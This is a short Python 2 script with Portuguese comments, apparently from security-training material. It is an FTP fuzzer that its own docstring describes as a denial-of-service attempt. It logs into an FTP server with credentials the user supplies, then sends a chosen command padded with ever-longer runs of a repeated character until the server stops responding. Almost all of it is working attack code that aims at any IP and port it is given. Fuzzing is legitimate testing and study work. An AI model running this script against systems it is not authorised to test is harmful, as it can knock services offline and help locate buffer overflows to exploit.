#!/usr/bin/python
# -*- coding: UTF-8 -*-

"""
  Esse arquivo faz a tentiva de 
  DoS em um tipo de serviço 

  Modificado em 08 de outubro de 2016
  por Vitor Mazuco (vitor.mazuco@gmail.com)
"""

import socket
import sys

if len(sys.argv) != 6:
        print "Use - python ftp_fuzz.py [IP] [Número de porta] [Payload] [Intervalo] [Máximo]"
        print "Exemplo - ./ftp_fuzz.py 10.0.0.5 21 A 100 1000"
        print "Exemplo de uso do fuzz com a carga de payload"
        print "pode ser de 100 'A's, 200 'A's, etc...até no máximo 1000"
        sys.exit()

target = str(sys.argv[1])
port = int(sys.argv[2])
char = str(sys.argv[3])
i = int(sys.argv[4])
interval = int(sys.argv[4])
max = int(sys.argv[5])
user = raw_input(str("Entre com o usuário ftp: "))
passwd = raw_input(str("Entre com a senha ftp: "))
command = raw_input(str("Entre com o comando ftp: "))

while i <= max:
        try:
                payload = command + " " + (char * i)
                print "Enviando " + str(i) + " solicitações de payload (" + char + ")"
                s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                connect=s.connect((target,port))
                s.recv(1024)
                s.send('USER ' + user + '\r\n')
                s.recv(1024)
                s.send('PASS ' + passwd + '\r\n')
                s.recv(1024)
                s.send(payload + '\r\n')
                s.send('QUIT\r\n')
                s.recv(1024)
                s.close()
                i = i + interval
        except:
                print "\nNão foi possível enviar ... O servidor pode ter deixado de funcionar"
                sys.exit()

print "\nNão há indicação de que o servidor tenha caído"
